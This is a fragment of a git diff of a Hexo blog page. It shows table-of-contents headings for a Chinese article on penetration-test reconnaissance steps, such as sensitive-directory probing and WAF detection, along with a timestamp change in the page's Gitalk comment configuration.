toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">6.</span> <span class="toc-text">六、网站架构探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E3%80%81%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.</span> <span class="toc-text">七、敏感文件、敏感目录探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D%E9%82%AE%E7%AE%B1%E6%94%B6%E9%9B%86"><span class="toc-number">8.</span> <span class="toc-text">八、目标域名邮箱收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81WAF-%E6%8E%A2%E6%B5%8B"><span class="toc-number">9.</span> <span class="toc-text">九、WAF 探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E6%97%81%E7%AB%99%E3%80%81C-%E6%AE%B5"><span class="toc-number">10.</span> <span class="toc-text">十、旁站、C 段</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -488,7 +559,7 @@ if(true){
   	repo: 'myhexocomments',
   	owner: 'kur08a',
   	admin: ['kur08a'],
-  	id: 'Sat Mar 26 2022 22:23:48 GMT+0800',
+  	id: 'Sun Mar 27 2022 14:49:40 GMT+0800',
   	distractionFreeMode: 'true'
 })
 gitalk.render('gitalk-container') 
